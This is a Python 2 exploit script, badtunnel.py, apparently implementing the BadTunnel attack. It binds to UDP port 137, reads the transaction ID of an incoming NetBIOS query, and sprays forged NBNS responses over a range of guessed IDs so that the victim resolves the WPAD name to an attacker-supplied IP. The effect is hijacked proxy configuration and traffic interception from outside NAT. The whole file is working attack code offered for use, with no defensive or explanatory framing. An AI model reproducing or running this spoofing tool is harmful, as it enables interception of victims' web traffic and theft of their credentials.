__author__ = 'T3rry' 

# Poison a system's NetBIOS resolver for the WPAD name from outside NAT
# Usage: python badtunnel.py wpad_server_ip


from socket import *  
import sys
import binascii
import time 

HOST = '0.0.0.0'  
PORT = 137  
BUFSIZE = 1024  
ADDR = (HOST,PORT)
TRANSACTION_ID_BLOCK=100

NB_RESPONSE_PACKET='''
		FFFF
		8500
		0000000100000000
		20464846414542454543414341434143414341434143414341434143414341414100
		0020
		0001
		00FFFFFF
		0006
		0000
		FFFFFFFF
		'''   

PAYLOAD = binascii.a2b_hex((NB_RESPONSE_PACKET.replace('\t','').replace('\n','').replace(' ','')))

def usage():
	print ("usage: python badtunnel.py wpad_server_ip")
	
def parse_nbns(data):
	transaction_id=data[:2]
	print "TransactionId :", hex(ord(transaction_id[0])),hex(ord(transaction_id[1]))
	type= data[-4:-2]
	if type=='\x00\x20':
		print ("Type is: NB Query")
	elif type=='\x00\x21':
		print ("Type is: NBStat Query")
		return transaction_id
		
def convert_ipv4_address(ip):
    ip_addr = ip
    packed_ip_addr = inet_aton(ip_addr)
    unpacked_ip_addr = inet_ntoa(packed_ip_addr)
    return binascii.hexlify(packed_ip_addr)	
	
if __name__ == "__main__":  
	wpad_server_ip=''
	if(len(sys.argv) < 2 ):
		usage()
		exit()
	else:
		wpad_server_ip= binascii.a2b_hex(convert_ipv4_address(sys.argv[1]))
		print wpad_server_ip	
	badTunnel = socket(AF_INET, SOCK_DGRAM)  
	badTunnel.bind(ADDR)  
  
	while(True):
		transaction_id=0
		print ('Waiting for message...')
		data, addr = badTunnel.recvfrom(BUFSIZE)
		print ("[*] NetBIOS request from %s:%s..."%(addr[0],addr[1]))
		transaction_id=parse_nbns(data)
		if(transaction_id>0):
			index=binascii.b2a_hex(transaction_id)
			print ("Start sending payload data...")
			for i in range(int(index,16)-TRANSACTION_ID_BLOCK,int(index,16)+TRANSACTION_ID_BLOCK):
				data=list(PAYLOAD)
				id=binascii.a2b_hex(hex(i)[2:])
				data[0] =id[0]
				data[1] =id[1]
				data[58]=wpad_server_ip[0]
				data[59]=wpad_server_ip[1]
				data[60]=wpad_server_ip[2]
				data[61]=wpad_server_ip[3]
				payload=''.join(data)
				badTunnel.sendto(payload,addr)
				time.sleep(0.02)
			print ("Send payload data finished ")
	badTunnel.close() 